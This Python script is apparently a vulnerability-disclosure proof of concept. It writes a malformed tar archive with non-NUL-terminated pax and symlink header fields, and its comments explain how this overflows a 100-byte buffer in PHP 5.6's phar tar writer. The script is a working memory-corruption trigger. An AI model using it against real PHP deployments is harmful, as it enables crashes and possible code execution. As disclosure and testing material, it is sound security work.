# This creates an example .tar with:
#
# 1. a pax header with a ustar\x0000 magic
# 2. a symbolic link with mostly bogus header data
#
# `old' (tar.c:226) will be false due to #1, and with the prefix data of #2,
# `hdr->prefix' will be concatenated with `hdr->name' in `char name[256]',
# starting on tar.c:401:
#
#     else if (!last_was_longlink && !old && hdr->prefix[0] != 0) { ... }
#
# hdr->linkname..hdr->padding in #2 won't be NUL-terminated, resulting
# in a longer than 100 byte `entry.link' in tar.c:490:
#
#     entry.link = estrdup(hdr->linkname);
#
# With the php5-cli (5.6.11+dfsg-1ubuntu3.1) package provided by Ubuntu
# 15.10, as well as with a self-built php-5.6.17, `hdr' is followed by
# the concatenated `name' buffer.
#
# The resulting `entry.link' will thus be hdr->linkname..hdr->padding
# (355 bytes) + name (256 bytes) + whatever else until a NUL byte is
# encountered.
#
# The invocation of `strncpy()' in `phar_tar_writeheaders()' (tar.c:756)
# will therefore end up copying >= 611 bytes to `header.linkname' (100
# bytes)
#
#     strncpy(header.linkname, entry->link, strlen(entry->link));
#
import sys
import struct
from tarfile import (TarFile, TarInfo, calc_chksums, stn, itn,
					 POSIX_MAGIC, PAX_FORMAT, REGTYPE, BLOCKSIZE, SYMTYPE)

class Info(TarInfo):
	@staticmethod
	def _create_header(info, format):
		"""
		_create_header() is more or less copy-pasted from
		python2.7/tarfile.py with some minor changes to avoid
		NUL-termination.
		"""
		magic = POSIX_MAGIC
		if info["name"] != "././@PaxHeader":
			magic = "magic..."

		parts = [
			stn(info.get("name", ""), 100),
			itn(info.get("mode", 0) & 07777, 8, format),
			itn(info.get("uid", 0), 8, format),
			itn(info.get("gid", 0), 8, format),
			itn(info.get("size", 0), 12, format),
			itn(info.get("mtime", 0), 12, format),
			"        ", # checksum field
			info.get("type", REGTYPE),
			stn(info.get("linkname", ""), 100),
			pad(magic, 8),
			pad("uname...", 32),
			pad("gname...", 32),
			pad("major...", 8),
			pad("minor...", 8),
			pad("prefix...", 155),
			pad("padding...", 12)
		]

		buf = struct.pack("%ds" % BLOCKSIZE, "".join(parts))
		chksum = calc_chksums(buf[-BLOCKSIZE:])[0]
		buf = buf[:-364] + "%06o\0" % chksum + buf[-357:]
		return buf

def pad(s, length):
	return (s * length)[:length]

def main():
	if len(sys.argv) != 2:
		sys.exit("%s out" % sys.argv[0])

	tar = TarFile(sys.argv[1], "w", format=PAX_FORMAT)

	info = Info()
	info.type = SYMTYPE
	info.linkname = pad("linkname...", 155)
	info.name = pad("name...", 100)

	tar.addfile(info)
	tar.close()

if __name__ == "__main__":
	main()